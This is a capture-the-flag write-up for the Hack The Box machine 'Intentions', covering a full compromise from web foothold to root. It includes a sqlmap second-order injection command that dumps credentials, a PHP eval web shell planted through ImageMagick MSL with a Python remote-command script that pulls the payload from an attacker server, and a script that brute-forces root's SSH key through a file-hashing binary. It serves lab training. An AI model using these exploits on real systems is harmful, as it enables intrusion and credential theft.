# Hack The Box - Intentions by StuckAt

There is a second order sql injection that allows us to dump the database.
To abuse it register an account and login.
We need two requests for sqlmap.
First go to "Your Profile" and update "Favorite Genres" to get a request to /api/v1/gallery/user/genres. Use Burp's "Copy to File" and save it as "user-genres.req"
Second go to "Your Feed" and save the request to "/api/v1/gallery/user/feed" same as before as "user-feed.req"

After this we can use sqlmap to dump the database like so:
```sqlmap -r user-genres.req --second-req user-feed.req --batch --level=5 --risk=3 --tamper=space2comment -D intentions -T users -C admin,email,password --where "admin=1" --dump```

With this you should get email and password for admin users.

From /js/admin.js, we can see this:
```
Hey team, I've deployed the v2 API to production and have started using it in the admin section.
Let me know if you spot any bugs.
This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!
By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.
This should take care of the concerns raised by our users regarding our lack of HTTPS connection.```
```
So, we can use the v2 of api to login with the hash we got by making a request to "/api/v2/auth/login" with json like this:
{"email":"","hash":""}

This allows us to login as admin and access to /admin and /api/v2/admin/image/modify

At this point we can get rce with the technique from here: https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

I wrote a python script for it:
First, create our payload png: ```convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' lol.png```
Second, start a http-server to serve the said png.
After that, update the local_url, target_url, admin_email, admin_hash on the script and run it.
This should get you rce as www-data.

```python
#!/usr/bin/env python3

import requests
import threading
import base64

local_url = "http://<local_ip:port>"
target_url = "http://<target_ip>"
admin_email = "<admin_email>"
admin_hash = "<admin_hash>"

login_url = target_url + "/api/v2/auth/login"
json = {"email":admin_email,"hash":admin_hash}
s = requests.session()
s.post(login_url, json=json)

msl_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="{local_url}/lol.png" />
<write filename="/var/www/html/intentions/public/lol.php" />
</image>'''

files = {"lol":("lol.msl", msl_file)}
def create_msl_on_temp():
    url = target_url + "/api/v2/admin/image/modify"
    s.post(url, files=files)

json = {
    'path': 'vid:msl:/tmp/php*',
    'effect': 'lol'
}
def try_include():
    url = target_url + "/api/v2/admin/image/modify"
    s.post(url, json=json)

threads = []
for i in range(30):
	threads.append(threading.Thread(target=create_msl_on_temp))
	threads.append(threading.Thread(target=try_include))

for t in threads:
	t.start()
for t in threads:
	t.join()

while True:
	try:
		cmd = input("cmd> ")
		cmd = base64.b64encode(cmd.rstrip().encode()).decode()
		data = {
	    	"a":f"""system("echo {cmd} | base64 -d | bash");"""
		}
		payload_url = target_url + "/lol.php"
		r = requests.post(payload_url, data=data)
		print(r.text.split("Copyright")[1].encode().split(b"\n6\x11\xef\xbf")[0].decode())
	except KeyboardInterrupt:
		exit(0)
```

For www-data to greg:
There is a git repo at /var/www/html/intentions/.git
Tar and download it.

With ```git log``` we see this commit:

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

Checking it with ```git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4```, we get creds for greg, which we can use for ssh.

For greg to root:

We see that greg is member of the scanner group, thus can run the /opt/scanner/scanner

This binary has ```cap_dac_read_search=ep``` capability so it can read any file.
```
greg@intentions:~$ getcap /opt/scanner/scanner 
/opt/scanner/scanner cap_dac_read_search=ep
```

Running it we get the help for it.
It hashes a file we provide with -c and compares it to the hash we provided with -s, also if we use the -p flag for the DEBUG, it gives us the hash of the file we provided.

```/opt/scanner/scanner -c /etc/passwd -s 5d41402abc4b2a76b9719d911017c592 -p```
[DEBUG] /etc/passwd has hash 0f1e356b6447c11283c68a0c6b904270

One interesting flag we can use is:
``` 
-l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
```

Which allows us to hash a file by starting with one byte and adding one byte at a time, thus allowing us to brute-force the contents of the file.

I also wrote a python script for it that allows us to read any file:
```python
#!/usr/bin/env python3

import hashlib
import os
import string

file_to_brute = "/root/.ssh/id_rsa"
charset = string.printable
current_read = ""

def find_char(temp_hash):
    for i in charset:
        test_data = current_read + i
        current_hash = hashlib.md5(test_data.encode()).hexdigest()
        if temp_hash == current_hash:
            return i
    return None

def get_hash(i):
    temp_hash = os.popen(f"/opt/scanner/scanner -c {file_to_brute} -s 5d41402abc4b2a76b9719d911017c592 -p -l {i}").read().split(" ")[-1].rstrip()
    return temp_hash

i = 1
while True:
    temp_hash = get_hash(i)
    new_char = find_char(temp_hash)
    if not new_char:
        break
    else:
        current_read += new_char
        i += 1
print(current_read)
```

Running it on the box we get the ssh key and login as root.